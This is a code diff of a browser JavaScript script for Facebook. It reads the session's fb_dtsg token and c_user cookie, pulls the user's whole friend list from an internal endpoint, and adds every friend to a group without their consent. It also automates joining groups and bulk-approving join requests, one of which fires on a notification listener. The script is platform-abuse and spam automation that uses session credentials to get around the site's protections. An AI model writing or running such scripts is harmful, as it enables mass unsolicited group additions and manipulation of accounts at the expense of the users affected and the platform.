@@ -1,50 +1,13 @@
-function get(url) {
-	// Return a new promise.
-	return new Promise(function (resolve, reject) {
-		// Do the usual XHR stuff
-		var req = new XMLHttpRequest();
-		req.open('GET', url);
-
-		req.onload = function () {
-			// This is called even on 404 etc
-			// so check the status
-			if (req.status == 200) {
-				// Resolve the promise with the response text
-				resolve(req.response);
-			}
-			else {
-				// Otherwise reject with the status text
-				// which will hopefully be a meaningful error
-				reject(Error(req.statusText));
-			}
-		};
-
-		// Handle network errors
-		req.onerror = function () {
-			reject(Error("Network Error"));
-		};
-
-		// Make the request
-		req.send();
-	});
+function args(data) {
+	var arr = [];
+	for(let key in data) {
+		arr.push(`${key}=${data[key]}`);
+	}
+	return arr.join('&');
 }
 
-function addFriend(opts) {
+function addFriend({dtsg, gid, friend, uid}) {
 	var xhr = new XMLHttpRequest();
-	var params = [
-		`__a=1`,
-		`fb_dtsg=${opts.dtsg}`,
-		`group_id=${opts.gid}`,
-		`source=typeahead`,
-		`ref=`,
-		`message_id=`,
-		`members=${opts.friend.uid}`,
-		`__user=${opts.uid}`,
-		`phstamp=`
-	];
-
-	var paramsString = params.join('&');
-
 	xhr.open("POST", "/ajax/groups/members/add_post.php", true),
 	xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded"),
 	xhr.onreadystatechange = () => {
@@ -53,31 +16,78 @@ function addFriend(opts) {
 			console.log(data);
 		}
 	};
-	xhr.send(paramsString);
+	xhr.send(args({
+		'__a': 1,
+		'fb_dtsg': dtsg,
+		'group_id': gid,
+		'source': 'typeahead',
+		'ref': '',
+		'message_id': '',
+		'members': friend.uid,
+		'__user': uid,
+		'phstamp': '',
+	}));
 }
 
-function addFriends() {
-	var dtsg = document.getElementsByName("fb_dtsg")[0].value;
-	var uid = document.cookie.match(/c_user=(\d+)/)[1];
-	var gid = document.getElementsByName("group_id")[0].value;
-
-	get(`/ajax/typeahead/first_degree.php?__a=1&viewer=${uid}&token=${Math.random()}&filter[0]=user&options[0]=friends_only`)
-	.then(response =>  {
-		var data = JSON.parse( response.substr(9) );
-		var friends;
-
-		if (data.payload && data.payload.entries) {
-			var friends = data.payload.entries.sort(() => .5 - Math.random());
-		};
-
-		for (let friend of friends) {
-			addFriend({ dtsg, uid, gid, friend });
+function addFriends({dtsg, uid, gid}) {
+	var params = args({
+		'__a': 1,
+		'viewer': uid,
+		'token': Math.random(),
+		'filter[0]': 'user',
+		'options[0]': 'friends_only',
+	});
+	var xhr = new XMLHttpRequest();
+	xhr.open('GET', `/ajax/typeahead/first_degree.php?${params}`);
+	xhr.onload = () => {
+		if (xhr.status == 200) {
+			var data = JSON.parse( xhr.response.substr(9) );
+			if (data.payload && data.payload.entries) {
+				var friends = data.payload.entries.sort(() => .5 - Math.random());
+				for (let friend of friends) {
+					addFriend({ dtsg, uid, gid, friend });
+				}
+			};
 		}
-	}).catch(error => {
-		console.log("Failed!", error);
-		// debugger;
+	};
+	xhr.send();
+}
+
+function joinCurrentGroup() {
+	document.querySelector('#fbProfileCover [ajaxify]').click();
+}
+
+function addPeopleInCurrentGroup() {
+	addFriends({
+		dtsg: document.querySelector('[name=fb_dtsg]').value,
+		uid: document.cookie.match(/c_user=(\d+)/)[1],
+		gid: document.querySelector('[name=group_id]').value,
 	});
 }
 
-addFriends();
+// https://www.facebook.com/groups/785323994921883/requests/
+function approveAllInCurrentGroup() {
+	document.querySelector('#pagelet_group_requests [ajaxify*=confirm_bulk_action]:not([ajaxify*=ignore])').click();
 
+	var watcher = setInterval(() => {
+		var layerConfirm = document.querySelector('.layerConfirm');
+		if (layerConfirm) {
+			clearInterval(watcher);
+			layerConfirm.click();
+		};
+	}, 50);
+
+}
+
+function onNotificationChange() {
+	document.getElementById('notificationsCountValue')
+	.addEventListener('DOMNodeInserted', e => {
+		document.querySelector('#groupsUnifiedQueue [ajaxify*="groups/unified_queue/async_response/?queue=requests&groupid"]').click();
+		var watcher = setInterval(() => {
+			if (document.querySelector('#pagelet_group_requests [ajaxify*=confirm_bulk_action]:not([ajaxify*=ignore])')) {
+				clearInterval(watcher);
+				approveAllInCurrentGroup();
+			};
+		}, 50);
+	});
+}
